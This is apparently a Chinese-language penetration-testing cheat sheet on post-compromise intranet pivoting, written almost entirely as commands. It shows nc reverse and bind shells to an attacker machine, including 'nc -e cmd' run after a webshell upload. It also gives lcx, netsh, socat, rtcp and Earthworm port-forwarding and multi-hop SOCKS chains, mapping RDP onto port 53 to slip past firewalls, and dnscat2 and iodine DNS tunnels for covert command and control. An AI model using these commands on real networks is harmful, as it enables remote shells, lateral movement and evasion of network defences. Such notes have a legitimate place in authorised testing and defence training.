NC


nc反向连接（攻击者A无法访问内网B，内网B可以访问攻击者A）：

在内网B中执行(假设使用了webshell等方式上传了一个nc上去)

nc -e cmd 192.168.1.194 7777

在kali下执行

nc -lnvp 7777

即可得到server03的会话


nc正向连接（攻击者A可以访问内网B，内网B无法访问攻击者A）：

在内网B中执行

 nc–l –p 5555 –e cmd .exe

在外网A中执行

nc -nvv 192.168.1.199 5555



LCX


lcx用法一（A外网无法访问 内网B【A为攻击者处于外网】

B内网可以访问 外网A）：

在主机B上执行：

lcx.exe–slave 192.168.1.1947777 192.168.1.1993389

将内网(192.168.1.194)的3389端口转发到公网(192.168.1.199)的7777端口

在主机A上执行：

lcx.exe –listen 7777 5555
或者：
./portmap-m 2 -p1 7777 -p2 5555
意思是将7777端口的流量转发到本地的5555端口

此时连接本地的5555端口就等于是连接192.168.1.194的3389端口

LCX用法二（A外网可以访问 B、B内网可以访问 C、A不能访问C）：

在主机B上执行：

lcx.exe–tran 7777 192.168.117.1693389

表示将192.168.117.169的3389端口转发到本地的7777端口上来

此时连接B的7777端口，就等于连接到192.168.117.169的3389端口

LCX用法三（如果server中有防火墙不允许3389出站，那么可以用tran将3389映射到防火墙允许出站的端口，比如53端口。）：

lcx.exe -tran 53 127.0.0.1 3389


netsh


添加转发：

netsh interface portproxy add v4tov4 listenport=5555 connectport=3389connectaddress=192.168.117.169 protocol=tcp

netsh interface portproxy dump

socat（nc增强版）


用法一：（A可以访问B，B可以访问C，但是A不能访问C）

在B上执行：

C:\Documents and Settings\Administrator\桌面\socat>socat.exeTCP4-LISTEN:5555,re
useaddr,fork TCP4:192.168.117.169:3389

代表将5555端口过来的流量，转发到192.168.117.169的3389端口上，所以此时连接192.168.1.199的5555端口，就等于连接到了192.168.117.169的3389端口上去


用法二、端口映射：

在一个NAT环境，如何从外部连接到内部的一个端口呢？只要能够在内部运行socat就可以了

在B上运行：

C:\Documents and Settings\Administrator\桌面\socat>socat.exetcp-listen:1234 tcp -listen:4444

在C上运行：

PS C:\Users\Administrator\Desktop\socat> .\socat.exetcp:192.168.117.166:1234 tcp:192.168.117.169:3389

这样，你外部机器上的4444就映射在内部网192.168.117.169的3389端口上。

注意，最好是对应的服务端口进行映射。

详细用法，参考：https://payloads.online/tools/socat

rtcp（py的端口转发）


使用场景

        A服务器在内网，公网无法直接访问这台服务器，但是A服务器可以联网访问公网的B 服务器（假设IP 为222.2.2.2）。

        我们也可以访问公网的B服务器。我们的目标是访问A 服务器的22端口。那么可以这样：

        在B 服务器上运行：

./rtcp.py l:10001 l:10002

 表示在本地监听了10001 与10002两个端口，这样，这两个端口就可以互相传输数据了。

        在A 服务器上运行：

./rtcp.py c:localhost:22 c:222.2.2.2:10001

表示连接本地的22 端口与B 服务器的10001端口，这两个端口也可以互相传输数据了。

然后我们就可以这样来访问A 服务器的22 端口了：ssh -p 10002 222.2.2.2



ew（Earthworm）


EW是一套便携式的网络穿透工具，具有SOCKS

v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透

该工具共有6种命令格式：ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran

正向socks5：

目标网络边界存在公网IP且可任意开监听端口：

在主机B上执行：

ew -s ssocksd -l 1080

然后使用proxychanis或者其他代理软件代理上该代理


此时你做的一切操作就等于在192.168.1.199上操作一样了

流量走向：A<-> B:1080 <-> C

反向socks5：

目标网络边界不存在公网IP，需要通过反弹方式创建socks 代理

在主机B上执行

监听8888端口，并将其转发到1080端口

ew -s rcsocks -l 1080 -e 8888

在主机C上执行

将本地的内容反弹到192.168.117.166的8888端口上去

ew -s rssocks -d 192.168.117.166 -e 8888

此时A已然可以使用B作为代理去访问C的任何服务

流量走向：A<-> B:1080 <-> B:8888 <-> C

端口转发

lcx_tran、lcx_listen、lcx_slave的用法

用法一：

在B中执行：

ew -s ssocksd -l 9999

然后通过lcx_tran来转发9999到1080

ew.exe -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999

意思是将1080端口收到的socks代理请求转交给B主机的9999端口。

实际的原理还是与lcx类似，只是中间加了一层socks代理罢了


用法二：

在B上执行：

C:\Documents and Settings\Administrator\桌面>ew_for_win_32.exe-s lcx_listen -l 1080 -e 8888

表示监听8888端口并将其转发到1080端口上去。

在C上执行：

PS C:\Users\Administrator\Desktop> .\ew_for_win_32.exe  -s rssocks-d 192.168.117.166 -e 8888

表示反弹一个socks5的shell到192.168.117.166的8888端口上去


多级代理


网络拓扑如下：

a: 192.168.1.100
b: 192.168.1.101,10.0.0.1
c:10.0.0.2,172.16.0.1
d: 172.16.0.2

执行的操作如下：

a: ew.exe -s lcx_listen -l 1080 -e 8888
b: ew.exe -s lcx_slave-d 192.168.1.100 -e 8888 -f 10.0.0.2  -g 9999
c: ew.exe -slcx_tran -l 9999 -f 172.16.0.2 -g 3389

流量走向：a1080 <-> a 8888 <-> b 9999 <-> c 9999 <-> d3389

总结：

目前工具提供六种链路状态，可通过-s参数进行选定，分别为:

ssocksdrcsocks rssocks

lcx_slavelcx_tran lcx_listen

其中SOCKS5服务的核心逻辑支持由ssocksd 和rssocks

提供，分别对应正向与反向socks代理。

其余的lcx链路状态用于打通测试主机同socks服务器之间的通路。

lcx 类别管道

lcx_slave该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。

lcx_tran该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。

lcx_listen 该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。

dnscat2


dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道，它的一大特色就是服务端会有一个命令行控制台，所有的指令都可以在该控制台内完成。包括：文件上传、下载、反弹Shell……


支持的模式


  1. 直连模式：客户端直接向指定IP的恶意DNS服务器发起DNS解析请求

  2. 中继模式：像我们平时上网一样，DNS解析先经过互联网的迭代解析，最后指向我们的恶意DNS服务器。相比直连，速度较慢，但是更安全。

  3. Type：DNS解析的类型，常见的有：A、CNAME、MX、TXT……


默认是TXT、CHAME、MX混合使用


运行模式如大多DNS隧道工具一样：Dnscat2客户端->DNS服务商->Dnscat2服务端。


常用参数说明：


  1. –secret 自定义连接密码

  2. –security 规定了安全级别。open代表不加密

  3. –no-cache 禁止缓存

  4. -e参数可以规定安全级别。


直连模式下的DNS隧道创建：

首先在服务端执行：

iodine(速度快，但win10不可用)


iodine基于C语言开发，分为服务端程序 iodined 和客户端程序 iodine，kali系统已内置

支持EDNS、base32，base64，base128等多种编码规范

当然github上也有相应的windows版，可以直接开箱即用。不过windows版需先安装TAP。安装方法如下：
下载openVPN，安装时仅选择TAP-Win32driver即可。安装后，可以发现服务器多出一块网卡


Server:
iodined  [options] <tunnel_ip><topdomain>

tunnel_ip    :   指定server在TUN接口上的IP，客户端的TUN接口IP会和服务端在同一子网内
topdomain   :    用来构造域名的上级域，也就是我们ns记录中的指定域名

Options:

-D           :    指定调试级别，-DD指第二级，‘D’随等级增加

Client:
iodine[options] <topdomain>

Options:

-r        :    采用DNS中继模式传输数据
-M           :    指定上行主机名大小
-m        :    调节最大下行分片大小
-T        :    指定所使用的DNS请求类型，可选有NULL,PRIVATE,TXT,SRV,MX,CNAME,A
-O        :    指定数据编码规范
-L        :    是否使用懒惰模式，默认开启
-I        :    指定请求间的时间间隔

公用Options:
-f                :    前台运行
-Ppassword     :    指定一个password进行认证，如果不指定，后续会提示

在服务端机器上，执行：


iodined -P 123456 -f -DD 192.168.1.149 abc.com


在客户端机器上，执行：


iodine -P 123456 -f -r -T TXT 192.168.1.149 abc.com
